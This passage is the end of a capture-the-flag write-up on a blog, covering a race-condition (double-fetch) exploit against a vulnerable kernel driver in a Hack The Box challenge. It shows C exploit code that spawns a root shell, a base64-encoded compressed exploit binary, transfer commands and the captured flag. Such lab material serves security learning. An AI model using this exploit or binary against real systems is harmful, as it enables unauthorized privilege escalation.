+    <span class="mtk1">user_parameters[</span><span class="mtk6">1</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">03</span><span class="mtk1">;</span>
+
+    <span class="mtk1">fd</span> <span class="mtk5">=</span> <span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/dev/mysu"</span><span class="mtk1">,</span> <span class="mtk1">O_RDWR);</span>
+    <span class="mtk8">write</span><span class="mtk1">(fd,</span> <span class="mtk1">user_parameters,</span> <span class="mtk5">sizeof</span><span class="mtk1">(user_parameters));</span>
+    <span class="mtk8">close</span><span class="mtk1">(fd);</span>
+
+    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">getuid</span><span class="mtk1">()</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
+      <span class="mtk1">done</span> <span class="mtk5">=</span> <span class="mtk6">1</span><span class="mtk1">;</span>
+      <span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"/bin/sh"</span><span class="mtk1">);</span>
+    <span class="mtk1">}</span>
+  <span class="mtk1">}</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">()</span> <span class="mtk1">{</span>
+  <span class="mtk7 mtki">pthread_t</span> <span class="mtk1">thread_uid_0;</span>
+  <span class="mtk7 mtki">pthread_t</span> <span class="mtk1">thread_uid_1000;</span>
+
+  <span class="mtk8">pthread_create</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">thread_uid_0,</span> <span class="mtk6">NULL</span><span class="mtk1">,</span> <span class="mtk1">change_uid_0,</span> <span class="mtk6">NULL</span><span class="mtk1">);</span>
+  <span class="mtk8">pthread_create</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">thread_uid_1000,</span> <span class="mtk6">NULL</span><span class="mtk1">,</span> <span class="mtk1">change_uid_1000,</span> <span class="mtk6">NULL</span><span class="mtk1">);</span>  
+
+  <span class="mtk8">pthread_join</span><span class="mtk1">(thread_uid_0,</span> <span class="mtk6">NULL</span><span class="mtk1">);</span>
+  <span class="mtk8">pthread_join</span><span class="mtk1">(thread_uid_1000,</span> <span class="mtk6">NULL</span><span class="mtk1">);</span>
+
+  <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><h2 id="flag">Flag</h2><p>The shared libraries that are needed are the following ones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gcc</span> <span class="mtku">exploit.c</span> -o exploit -l pthread
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">exploit</span>
+        linux-vdso.so.1 (0x00007ffdced0c000)
+        libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f1ecd2bf000)  
+        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1ecd0cd000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f1ecd2fc000)
+</code></pre></div><p>The one that we might check is <code>libpthread</code>, which is installed in the remote instance, so no problems. Otherwise, we must have compiled the binary as static, so that it needs no shared libraries (but the resulting in a heavier file).</p><p>In order to transfer the binary, we will compress it and then copy the compressed data encoded in Base64:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gcc</span> <span class="mtku">exploit.c</span> -o exploit -l pthread
+
+<span class="code-cyan">$</span> <span class="code-dark-green">md5sum</span> <span class="mtku">exploit</span>
+7fcd70685f49ca890285d61b90a86479  exploit
+
+<span class="code-cyan">$</span> <span class="code-dark-green">gzip</span> <span class="mtku">exploit</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">base64</span> -w0 <span class="mtku">exploit.gz</span>
+H4sICPe+b2IAA2V4cGxvaXQA7Vt9cBvFFV+dLFsGW3bACY4TiKBk6kAty4kTzIcby7bsc8cJaWIXOnwcsnS2VfSFdCI2UGomOFRjDIa2kD/KEJjpFAZawkw7E/pBnTGEAIUh006hZZi6hbSiBWoCtGlJcn27t3u6W90FyvQP/riXOb17v31v9+3bvc2tb9+3woN9gsuFGLnRlxGWupZpchfFr7tUVwGsA9XC7xp0DqoEucKgx/PXBDP36u1odo1uTeb5amTmLgOvQPZUrDJzVF+y8xhkng9XmLnRjkB+inN8v8vMjXY4NpkWTc50mvnjNB77BbOdQO2mqN1Up5kjwcxZPCvo1UHjx3Pefd7uSqrH815k5iw8O44osc/S3jZq10gLeD6EzJy191Wwq0Sfntjwbqft2Y3DnGDmbBhbE/GRTe2tiVhLIp7KT7RMdGxq2dQeyKUD63W/cBt4TvVvHcbDMY8xt8HvBirj8v2DO/2v3vzEHf968IvfHdsxtDg9fd4wq8NFdRDVZ0OM6H0tKs0nhG4jv7W0/LD8cvJUcbgOrjMscPx4+y3wfhv9W23w+2zwu23wLTb44zb4b238TNvo77DBW2zqeQCu8yxwBOOfUcazciSGBz2IpIGhLVJMzspj8ZwiZ4e29CTSKXkoMpKQtTLLkp3ZuCKjaCKdkxGtTvpGOp7ShSj8gkY6I6dwk1Hc2CYkSTklEr1eio5fL41G4gmUm4Sqk2hMVvLxGBRHJyLSaDwVScRvguYlbIlNsoqUjEDt/YMD3T3S+sD6wEb9vh30xpLpFNWTcCcFcrlhtlYAryASxipgvglIQdr8DMKVb4pXY/xpijXE47V4tr5Aw+Ui/0rPnaYvEH1M7Hlj64CfDtIEhy/S/3e8XWacya9t1nglMj8niwbca8CLBrzagC8Z8BoDfsyA1xrwPRSvQqU1AtNeA+424I8YcOP/V/sMuMeA7zfgxnVu3oBXGfBDBvw0A/6KAT8dOeSQQw455JBDDpXTB3Xn/Efc9Y5XnPH8vhUhcXpeEdRXxF3PeBdIubpxBOCj6toosLo1RH8cFxx9+0+qqs4R2UXkw7osEPmALruJ/KQuVxD5IV32EPkeXa4k8m26XEXkG5gM3nQSb3o1/0F+KWCWn+XkX3LyTzn5R5z8A05+gJO/Z5Tb3h0oHL5WLPxZ3PXW0rahwVnPXyAC4mxtmrDOFyE+6vIsmHw4B+KjAYx6Hsbs4mPKcgj91oAW+mp1sW7NFA7vAuWgP0n0N2J7cd1JsbAkHnhvs3jgmFt0HRQPn1QaoIK1tAKvujhK/GL22L+pzjYoRvkLh8VdnQK+FQtHlBpxprMShOKjJ1W1GIPgHvRUg+y6BmxN9m/vhEJ8Mwx2MFn8YuGbxb+PHvS8jHdVBz2HMHta0Lx9At6a92PL4gGotxA+PhM+/rMaUrbxQVAsPFe8EgoAhbu7cNNx+Jmez694zjPTor1cQzVZqKYoYUXPJKDQtbm55xesnBiA4uJBTw8wN3PiAt2Jy8qcaNKc+M0J5kQ1duKtE8yJypIT74JJ8Q9Y0fPhlyydiIkzFWubSUTDx9rmxdlw8Slt2Ja/CNWS3Y8IbQxDJVC4xAo3qIbCDlw4Ey7qwP0asKQDuwEg/RFnho/FxA0NpE3FUzwbCp5fGA3UrbmdPK7k+QhdMTjb+Z11CIW+NlD4XWh4oPBRaChUOD4szrbcDvCOwXUn8DNfVD+Gdg6ccCtr2l6n4z1YODpYeK+38NeQ2vBHcdeCS7z4jfzf8Hpw1TWhq0PXhK4NSQujpQZxewvGdURfORxyyCGHHHLIIYcccsihzxvh7zytMfnG1uRkLo9aR+Kp1hze37tWuS/F32DxNxPvkqp+G/ge4PuAPwL8EPDm91U1A3zZUVVdBH4fcLx1WvWBqvqB7wfeBbz5Q7CnH00aWLs3bUeuiXrXqpoq75xLw/G3/n1QdytW6K0in5LOh6sdrol/wOYfA776Pl/jV+pO3+mdQpubLrlgw/nnsXqvhmsR9Ng3KIbj71ivAT5lwHFbd8K1DvowjYGwr3630FNbKdwCHmnl+JvkXaco/zVcH0D5vabyAinH38vfgSsDMZFxeZ+v/m5hwNd4lzvs889WhH3Nd3p6fcHdlaKvY1dVv68r5esI+YIhX3O3z9/ta+z21Xf7vOR7WjvEZw/UY/xe5JBDDjnkkEMOOeSQQw59/omde2Pn3Iznmo1coVw/m0Y3NexMmkg3UiupzM7XraIyOwPXRDk7Z7eaK//opIqPUqK99PAa22M00ht2Fu0QLWdnzd6knJ0xa6R8OTITOxM3Rc+lsTN785Sz/SA723YW5c1VZny80uw3s2dn+lj75yCz3seq1j8XhU5SuZHWp1KZ+bVE5eO0//+msvFs3/+T9HPdHAXpeHdRvo3y6yjPUD5F+Rzle42b3/+B2PnKInQ0Fb25gLq6/P09PZf4m4dH8ikl77840B4ItrTlidR26/pgINgeaFun4aeu2w3Rb7QIoBui3mGJu/Xz52a8At1iiXv0+WvGK/V5a8ar9Pltxr36uJvxan2+mPHT9Hlpxk/X568ZrykdkDXhtchvifvQPku8Ds1b4vV63oYZX6avF2b8DMtD0W50pn4e34w3oIwlvlxff8z4Cn3dMeNnWc57NzzFbJ0w4ytLCSUmvAmttsRXlWFaHsf7Ko/j9VWAuGW4uPkovpfDz6X4IodfRNoo+cPW8T5yXx6HJK3Hzx1WnyT65fHcY+O/Xb8eJmUN6Cfn8iXW+vvI7/IyPw+QesrH6wWqz/v5Bvktnz9LpJ7y8V0r4DiUPxeVLnyOH+YznbfssVzhsj7fv95lfb7/CMHL589Wm3oiLpwb0YT8VJ+d3R51YRdXls23elyPUP58JW3qL9jgD9jgT9rgz9jgb1I/+f4u2cRHxf0VVurrP6MaAcehtD6wOKwStHF55UxNlin+C4TbbULNXD1vs3Gkz0srxS8UNH0+nhfR+jfQ+u+l+GUUX0c7PU3xAcE6DlfZ4HnSr5WonrbL3q+mBS0ObNwZ3SNYx+0x6s+POX9+Ltjkk0SzSk7Jj44GoqiURSIpSSmKs0VySJJiaWkskR6JJKSYks7mpEh+AkXTyUxCVuRYoCO4qc1aCSeCxKVINhuZlOSUkp1Eo9lIUpZi+WRyEkwMkgSaiklVnsgk0nEFvJKkvu2hLWEpvLVXkkAyqcaQ1Pv1raEtAz3mEpJLAlD/1mEpLNIaxN7tSOofvLw7NChd3te3IzwkDYW6B8MSy1SJ5vLEaS4LpqvLmLdyqoQbklZjVo9BIZLkWESJlKXPlDTbaQqN2VbLrjFjJGeH84jPs+GLceN6SEy5NlCWS0vjkVSMpAtdDgWxeErK5+SYMSg4siCP5HK0GpLNEwW7MVkCt6UgyRQyt2vMKzKXQPVZKRPB4w8RxHMMosgG2DZnydBcWzAY5LKNzC2gQG4yqURGgCtZjY+zu3gKas6gQCqtyIGxVD6QyYLzWWXSAI3k44lYSzxGoVD3QIsSGUOkbDySG0eB2GQKmtC4ktVKboTOxNMpkyBBWVZORLAivcskFOwFhBTfBsbS9CYnR1FAkSdAJLMwkE2TaROQx+nDMh7LliStDm3CaxbsHpqKJONQmWYOw4YC8MQm4dGyWgI+C+E3Gfx/PNuf2OXJMnJx8heQtodi9nZ5moy8nLyJs+fzQ8/n9Pnc3AHOnr2/32LTPm9/BVz/hD0Ys2fv+Xu59tlrOO9/BGl7VGbP9gOMb6MBY3ldzJ7tJ+PInJPJ9g2Ms30wIz7+NyBtj8ns2f6CcTZ+zH8uvZfkXZ402LN9COPbUMl/AZX3fxYhmtenEduvMD7Ptc/3/35q301ltq9h3GjfaGH/EDLmrqKyvGv+TZ0f/+9z9myfxPgcp8+nd/+Qs2f7Kcb5bRRvv4+zZ/suxqc+wf4pzl7Pq6fcw+1PeX9+xdmz90zGazl9Pn7PIvP6wSdmr/gE+5c4e7t8bTv71zl7tn9kXOQeGH7+HkHaXoyFSc/fbrHW93L8fbjqDPZsfzPxKe1PIC32+t+xWD4+tWcdq+Ls2Dg+hrT+838Hm6IvwlOf0D7eBxnt9fd6+jcXfv3n+1ND//DF7Nn79mpqX8Pp8+O3jLbP/4mH2V/I4VZ/zxRQOYnU3k8DdzZcAVS+flQbfDfS+EUaf5WrnF9/l9nYb75E402cAW//X97j7yUgQwAA  
+</code></pre></div><p>We must copy the Base64 string and paste it in the remote target. Then decode it and uncompress it. Just as follows:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/ $ vi /tmp/exploit.gz.b64
+/ $ base64 -d /tmp/exploit.gz.b64 &gt; /tmp/exploit.gz  
+/ $ gzip -d /tmp/exploit.gz
+/ $ md5sum /tmp/exploit
+7fcd70685f49ca890285d61b90a86479  /tmp/exploit
+</code></pre></div><p>Both MD5 hashes match, so the exploit has been copied successfully. Now let&rsquo;s run it and get the flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/ $ chmod +x /tmp/exploit
+/ $ /tmp/exploit
+/ # cat flag
+HTB{C0ngr4ts_y0u_3xpl0it3d_A_D0uBlE-FeTcH}  
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#setup-environment">Setup environment</a></li><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#double-fetch">Double Fetch</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#password-hash-cracking">Password hash cracking</a></li><li><a href="#race-condition">Race condition</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
